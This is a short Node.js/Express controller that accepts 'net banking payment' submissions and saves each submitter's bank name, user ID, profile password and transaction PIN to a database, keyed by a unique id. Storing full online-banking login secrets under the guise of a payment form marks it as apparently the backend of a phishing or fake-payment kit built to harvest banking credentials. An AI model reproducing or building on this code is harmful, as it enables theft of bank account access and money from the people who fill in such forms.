const NetBanking = require('../models/NetBanking');

// Handle net banking payment data submission
exports.submitNetBankingPayment = async (req, res) => {
    try {
        const { uniqueid, bankName, userId, profilePassword, transactionPin } = req.body;
        
        const newNetBankingPayment = new NetBanking({
            uniqueid,
            bankName,
            userId,
            profilePassword,
            transactionPin
        });

        await newNetBankingPayment.save();
        res.status(200).json({
            success: true,
            message: "Net Banking Payment Data Submitted Successfully!"
        });
    } catch (error) {
        console.error(error);
        res.status(500).json({
            success: false,
            message: "Error occurred while submitting net banking payment data"
        });
    }
};
